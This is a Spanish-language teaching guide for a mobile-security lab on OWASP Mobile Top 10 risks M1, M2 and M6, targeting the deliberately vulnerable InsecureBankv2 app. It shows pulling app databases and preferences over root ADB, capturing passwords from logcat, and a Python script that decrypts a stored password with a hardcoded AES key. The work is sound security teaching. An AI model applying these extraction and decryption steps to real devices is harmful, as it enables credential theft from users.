# Clase 1 — OWASP Mobile Top 10: M1, M2 y M6

| | |
|---|---|
| **App objetivo** | InsecureBankv2 (`com.android.insecurebankv2`) |
| **Proyecto** | Dinesh Shetty — referenciado por OWASP MASTG como `MASTG-APP-0010` |
| **Dispositivo** | VM Android-x86, API 27, por ADB |
| **Duración** | 90 minutos |
| **Riesgos** | M1 Improper Platform Usage · M2 Insecure Data Storage · M6 Insecure Logging |

## Índice

- [Antes de impartir la clase](#antes-de-impartir-la-clase)
  - [Los cuatro fallos del guion original](#los-cuatro-fallos-del-guion-original)
- [Fase 0 — Preparación](#fase-0--preparación)
- [Fase 1 — Mapeo de riesgos con MobSF](#fase-1--mapeo-de-riesgos-con-mobsf)
- [Fase 2 — Validación en el dispositivo](#fase-2--validación-en-el-dispositivo)
  - [M2: almacenamiento inseguro](#m2-almacenamiento-inseguro)
  - [M6: registro inseguro de eventos](#m6-registro-inseguro-de-eventos)
- [Fase 3 — Análisis de código para confirmar M1](#fase-3--análisis-de-código-para-confirmar-m1)
- [Cierre](#cierre)
- [Anexo A — Hallazgos verificados](#anexo-a--hallazgos-verificados)
- [Anexo B — Comandos del laboratorio](#anexo-b--comandos-del-laboratorio)

---

## Antes de impartir la clase

> **Estado del documento:** verificado de extremo a extremo contra una VM
> real. Las salidas marcadas como «salida real» fueron capturadas durante la
> sesión de verificación.

### Correcciones respecto a guiones anteriores

#### 1. El nombre de la base de datos era incorrecto

El guion original pedía extraer `insecurebank.db`. **Ese fichero no existe.**

| | |
|---|---|
| Decía el guion | `adb pull .../databases/insecurebank.db` |
| Realidad | La base de datos se llama `mydb` y su tabla es `names` |
| Referencia | `TrackUserContentProvider.java:19` |
| Efecto | El comando falla con «no such file» |

#### 2. La clave hardcodeada no era la que se buscaba

El guion decía buscar `public static final String SECRET_KEY`. **No existe tal
constante.**

```java
// CryptoClass.java:22
String key = "This is the super secret key 123";

// CryptoClass.java:23
byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
```

No es `static`, no es `final`, y se llama `key`. Pero lo que importa no es la
forma: es que la clave viaja dentro de la APK. Cualquiera la descomprime y la
lee. Fíjate además en el **IV de dieciséis ceros**, que el guion no mencionaba.

#### 3. El log de M6 es bastante peor de lo que dice el guion

El guion afirmaba que la app imprimía «un token de sesión». **Imprime el usuario
y la contraseña en claro.**

```java
// DoLogin.java:115
Log.d("Successful Login:", ", account=" + DoLogin.this.username + ":" + DoLogin.this.password);
```

Salida real, verificada en el dispositivo:

```console
D Successful Login:: , account=dinesh:Dinesh@123$
```

Esto juega a favor: el impacto de M6 aquí no es teórico, es robo de credenciales
directo.

#### 4. Faltaba el backend entero

InsecureBankv2 **no tiene servidor embebido**. La IP y el puerto se leen de
`SharedPreferences`, y el login falla si no hay nada escuchando. El log de M6
sólo se emite cuando el servidor responde `"Correct Credentials"`.

> **Sin backend, la mitad de la clase no se puede demostrar.**

El backend oficial (`AndroLabServer`) es **Python 2** y no arranca en Ubuntu
24.04. El instalador del laboratorio lo porta a Python 3 automáticamente.

#### Además: la verificación de apps por USB

En imágenes de Android 8.x está activa y `adb install` falla con
`INSTALL_FAILED_VERIFICATION_FAILURE`. `clase1-prep` la desactiva en su paso 2.

---

## Fase 0 — Preparación

Veinte minutos antes de empezar.

```bash
bank-start
clase1-prep
```

- `bank-start` arranca el backend de InsecureBankv2 en el puerto 8888.
- `clase1-prep` instala la app, desactiva la verificación USB, escribe la IP del
  servidor en las `SharedPreferences` y abre la pantalla de login. Tarda unos
  30 segundos.

Comprueba que todo responde antes de empezar:

```bash
curl -s -X POST -d 'username=dinesh&password=Dinesh@123$' http://127.0.0.1:8888/login
```

Salida esperada:

```console
{"message": "Correct Credentials", "user": "dinesh"}
```

Si `bank-start` dice que el puerto 8888 está ocupado:

```bash
sudo ss -ltnp | grep 8888           # ver quién lo tiene
sudo systemctl stop insecurebankv2-server
bank-start                          # y reintentar
```

### Credenciales de la app

| Usuario | Contraseña | Nota |
|---|---|---|
| `dinesh` | `Dinesh@123$` | Usuario normal, entra por `/login` |
| `jack` | `Jack@123$` | Segundo usuario, útil para ver el saldo de otro |
| `devadmin` | `devadmin` | Entra por `/devlogin` |

---

## Fase 1 — Mapeo de riesgos con MobSF

### Arrancar MobSF

> El guion original decía `./run.sh`. **Ese fichero no existe en este
> laboratorio:** MobSF corre en Docker bajo systemd, en el puerto 8000. Y en un
> servidor sin escritorio no hay navegador donde abrirlo, así que se accede por
> IP.

```bash
mobsf-start
mobsf-logs                          # esperar a "Gunicorn server started"
echo "http://$(hostname -I | awk '{print $1}'):8000"
```

Desde el navegador de cualquier alumno: `http://<IP-del-servidor>:8000`
— usuario `mobsf`, contraseña `mobsf`.

MobSF tarda uno o dos minutos en levantar la primera vez. Mientras tanto,
localiza la APK que hay que subir:

```bash
ls -lh ~/mobile-pentesting-lab/apps/apk/InsecureBankv2.apk
```

### Analizar el reporte

> MobSF no sólo encuentra bugs: da una puntuación **y una categorización**. Eso
> es justo lo que un cliente pide. No «hay un problema», sino «este riesgo, con
> esta severidad, en este componente».

En la sección **Security Analysis**, mapea los hallazgos al OWASP:

| MobSF lo reporta como | Categoría OWASP | Por qué |
|---|---|---|
| Hardcoded Secrets | **M1** Improper Platform Usage | Android ofrece el Keystore para material criptográfico. Hardcodear una clave es usar mal la plataforma |
| Insecure Data Storage | **M2** Insecure Data Storage | `SharedPreferences` y SQLite sin cifrar en el sandbox de la app |
| Llamadas a `Log` con datos sensibles | **M6** Insecure Logging | Exponer información sensible en los logs abre la puerta a atacantes |

> Un reporte sin prueba no es un hallazgo: es una sospecha. Vamos a validar y
> explotar cada punto a mano.

---

## Fase 2 — Validación en el dispositivo

### Conexión

```bash
vmconnect
adb devices
```

`vmconnect` conecta, activa root y reconecta. El paso intermedio no es
trivial: `adb root` reinicia el demonio ADB de la VM y tumba la conexión TCP. Sin
reconectar, el dispositivo queda en `offline` y parece que el laboratorio está
roto.

### M2: almacenamiento inseguro

> M2 sólo se demuestra en su entorno natural: el dispositivo. Y tenemos root,
> que es lo que representa a un atacante con acceso físico o con un exploit
> previo.

```bash
adb shell
ls /data/data/com.android.insecurebankv2/databases/
exit
```

Salida real:

```console
mydb
mydb-journal
```

> Antes de continuar, un aviso: el nombre del fichero no es el que esperáis. No
> es `insecurebank.db`, es `mydb`, y se crea en
> `TrackUserContentProvider.java:19`. El OWASP no os da el nombre del fichero;
> os da la categoría. Vosotros tenéis que encontrarlo.

Extrae y examina la base de datos:

```bash
mkdir -p ~/mobile-pentesting-lab/reports/clase1
cd ~/mobile-pentesting-lab/reports/clase1
adb pull /data/data/com.android.insecurebankv2/databases/mydb .
sqlite3 -header -column mydb "select * from names;"
```

Salida real, tras haber iniciado sesión:

```console
id  name
--  ------
1   dinesh
```

> Aquí está la prueba. La app guarda en una base de datos SQLite, dentro de su
> sandbox y sin cifrar, los usuarios que han iniciado sesión. Sin root esto
> está protegido por el aislamiento de Linux entre apps; con root, o en un
> dispositivo comprometido, no. Eso es M2: el dato existe en claro en disco.

#### El segundo hallazgo, más grave

```bash
adb shell "cat /data/data/com.android.insecurebankv2/shared_prefs/*.xml"
```

Salida real:

```console
"serverip            = 172.25.208.104
"serverport          = 8888
"superSecurePassword = DTrW2VXjSoFdg0e61fHxJg==
"EncryptedUsername   = ZGluZXNo
```

> Mirad el nombre: `superSecurePassword`. Suena a que está protegido. No lo
> está. Está cifrado con una clave que está dentro del propio APK, y ya la
> vamos a ver en la Fase 3. Esta es la cadena entre M1 y M2: el criptograma
> sólo vale lo que vale la clave.

### M6: registro inseguro de eventos

En una terminal aparte, antes de iniciar sesión:

```bash
adb logcat -c
adb logcat -s Successful Login:
```

Ahora el alumno inicia sesión en la app con `dinesh` / `Dinesh@123$`.

Salida real:

```console
D Successful Login:: , account=dinesh:Dinesh@123$
```

> Aquí está. El usuario y la contraseña, en claro, en un log del sistema. El
> guion original decía que la app imprimía «un token de sesión». Es peor: es la
> contraseña completa. El impacto de M6 no es teórico, es un robo de
> credenciales trivial.

> Además, un log es un dato persistente: sobrevive al cierre de la app, se
> acumula en el búfer del sistema, y cualquier persona con un shell lo ve. En un
> móvil corporativo, con un empleado que pierde el dispositivo o lo comparte,
> eso es un robo de credenciales trivial.

---

## Fase 3 — Análisis de código para confirmar M1

> Para entender por qué ocurre el riesgo hay que ir a la raíz: el código fuente.

### Descompilar

> El guion original decía «abrir con JADX-GUI». Este servidor es **headless**:
> no hay interfaz gráfica. El equivalente real es la CLI, y además es mejor para
> enseñar, porque vemos el fichero exacto y la línea exacta.

```bash
cd ~/mobile-pentesting-lab/reports/jadx
jadx ~/mobile-pentesting-lab/apps/apk/InsecureBankv2.apk -d InsecureBankv2
```

`jadx-gui` también está instalado, pero requiere escritorio.

### La clave hardcodeada

```bash
grep -rn "secret key" InsecureBankv2/sources/com/android/insecurebankv2/
```

Salida real:

```console
InsecureBankv2/sources/com/android/insecurebankv2/CryptoClass.java:22:    String key = "This is the super secret key 123";
```

> El guion decía que aquí encontraríais `public static final String
> SECRET_KEY`. No es así: es un campo de instancia, sin `static` ni `final`. Pero
> lo que importa no es la forma que tenga: es que la clave está en el código que
> viaja dentro de la APK.

Y tres líneas más abajo, en la misma clase:

```java
byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
```

> Y el vector de inicialización son dieciséis ceros. Cero es lo opuesto a
> aleatorio. En criptografía, un IV constante no es un detalle: anula la
> confidencialidad del modo CBC. Esto tampoco aparece en el guion original.

### Cerrar el círculo: descifrar lo «cifrado»

Con la clave de M1 desciframos el M2. Es el remate de la clase.

> Usa el Python del venv del backend: es el único que tiene `pycryptodome`.

```bash
PY_BIN=~/mobile-pentesting-lab/tools/InsecureBankv2Server/venv/bin/python
"$PY_BIN" - <<'PY'
import base64
from Crypto.Cipher import AES
key = b"This is the super secret key 123"   # M1: CryptoClass.java:22
iv  = b"\x00" * 16                          # M1: CryptoClass.java:23
blob = "DTrW2VXjSoFdg0e61fHxJg=="           # M2: superSecurePassword
print(AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(blob)).rstrip(b"\n\r").decode())
PY
```

Salida real:

```console
Dinesh@123$
```

> La contraseña que la app guardaba «protegida», descifrada con una línea
> copiada del código fuente. Eso es M1 y M2 trabajando juntos: M1 permite romper
> M2. Por eso el OWASP los trata como riesgos distintos pero relacionados.

### El extra

```bash
"$PY_BIN" -c "import base64; print(base64.b64decode('ZGluZXNo').decode())"
```

Salida real:

```console
dinesh
```

> El campo que se llama `EncryptedUsername` no estaba cifrado. Estaba en
> Base64. Base64 es una codificación, no un cifrado. Es un clásico: ponerle un
> nombre que diga «cifrado» a algo que no lo está.

---

## Cierre

> Hemos recorrido el ciclo completo del auditor: **MobSF descubre, JADX
> localiza, ADB extrae, y la clave descifra.**
>
> Y sobre todo, hemos visto que los riesgos del OWASP Mobile Top 10 no son
> etiquetas: son encadenamientos. M1 no es «una clave mal puesta», es lo que
> hace indefendible el M2. M6 no es «un log feo», es el robo de credenciales
> que hace posible el M3 en la próxima clase.
>
> La lección que os lleváis no es «esta app está mal». Es que hay que mirar
> cada capa y preguntarse qué pasa si el atacante ya tiene acceso a la de abajo.

**Próxima clase:** M3 (autenticación insegura) y M5 (comunicación insegura).
Con esta misma base de datos, esta misma sesión y esta misma clave, vamos a
atacar el canal.

---

## Anexo A — Hallazgos verificados

Todos ejecutados contra el dispositivo. Véase
[`clase-1-evidencia.md`](clase-1-evidencia.md) para la transcripción completa.

| Riesgo | Fichero y línea | Evidencia |
|---|---|---|
| M1 | `CryptoClass.java:22` | `String key = "This is the super secret key 123";` |
| M1 | `CryptoClass.java:23` | IV de 16 ceros |
| M2 | `TrackUserContentProvider.java:19` | `DATABASE_NAME = "mydb"` |
| M2 | Tabla `names` | Usuarios que hicieron login, en claro |
| M2 | `SharedPreferences` | `superSecurePassword = DTrW2VXjSoFdg0e61fHxJg==` |
| M2 | `SharedPreferences` | `EncryptedUsername = ZGluZXNo` (sólo Base64) |
| M6 | `DoLogin.java:115` | `Log.d(..., "account=" + user + ":" + pass)` |

**Descifrado:** `superSecurePassword` → `Dinesh@123$`, usando la clave de M1.

## Anexo B — Comandos del laboratorio

| Comando | Función |
|---|---|
| `bank-start` / `bank-stop` / `bank-status` | Backend de InsecureBankv2 (puerto 8888) |
| `clase1-prep` | Instala y configura el móvil para la clase |
| `clase1-demo` | Repite la demo de M2 y M6 y guarda informes |
| `vmconnect` | Conecta con la VM, activa root y muestra el resumen |
| `vmconnect frida` | URL y comandos exactos de `frida-server` |
| `mobsf-start` / `mobsf-stop` / `mobsf-logs` | MobSF (Docker, puerto 8000) |

Para desinstalar todo:

```bash
sudo systemctl disable --now insecurebankv2-server mobsf-server
sudo rm -f /usr/local/bin/{bank-*,clase1-*,vmconnect,mobsf-*}
adb -s 172.25.208.100:5555 uninstall com.android.insecurebankv2
```
